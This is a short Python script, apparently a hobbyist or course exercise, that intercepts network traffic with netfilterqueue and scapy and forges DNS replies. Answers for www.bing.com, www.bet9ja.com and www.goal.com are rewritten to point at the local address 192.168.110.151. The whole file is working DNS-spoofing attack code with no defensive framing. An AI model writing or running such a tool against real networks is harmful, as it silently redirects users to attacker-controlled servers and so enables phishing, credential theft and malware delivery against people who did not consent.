#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        websites = ["www.bing.com", "www.bet9ja.com", "www.goal.com"]
        for website in websites:
            if website in qname:
                print("\n\n[+] spoofing target.\n\n")
                answer = scapy.DNSRR(rrname = qname, rdata = "192.168.110.151")
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS]. ancount = 1

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].chksum
                del scapy_packet[scapy.UDP].len

                packet.set_payload(str(scapy_packet))



    packet.accept()




queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
